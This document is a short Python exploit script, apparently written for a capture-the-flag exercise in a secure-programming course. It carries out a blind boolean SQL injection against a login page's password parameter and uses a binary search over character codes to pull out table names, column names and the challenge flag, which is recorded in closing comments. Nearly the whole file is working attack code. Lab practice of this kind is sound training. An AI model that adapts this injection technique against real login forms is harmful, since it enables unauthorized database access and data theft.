#!/usr/bin/env python3

"""
and (a boolean condition)

a condition could be


ascii(
    substr(
        ( {select whatever you want} limit 481,1) , {char count}, 1
    )
) > {binary search pivot}


we use a binary search method to get $select_result[$char_count]

"""

import urllib.request

# select tabel_name
qr = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin%20%27%20and%20ascii(substr((%20SELECT%20table_name%20FROM%20information_schema.columns%20limit%20481,1%20),{},1))%20{}{}%20%23"
# select column_name
qr = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin%20%27%20and%20ascii(substr((%20SELECT%20column_name%20FROM%20information_schema.columns%20limit%20481,1%20),{},1))%20{}{}%20%23"
# select flag from iamflag
qr = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin%20%27%20and%20ascii(substr((%20SELECT%20flag%20FROM%20iamflag%20),{},1))%20{}{}%20%23"

ans = ''

for i in range(41):
    n = 128
    a = n
    b = 0

    while b < a and b != a-1:
        t = (a + b) // 2
        req = urllib.request.Request(qr.format(i, '>', t))
        req.add_header('User-Agent', 'Chrome/27.0.1453.93')
        doc = urllib.request.urlopen(req)
        s = doc.read()
        print(s.decode())

        if 'Success' in s.decode():
            b = (a + b) // 2
        else:
            a = (a + b) // 2

        print((a, b))

    ans += chr(a)
print(ans)


# table name = iamflag
# column name = flag
# SecProg{HelloMyFirstBooleanSQLINJECTION}
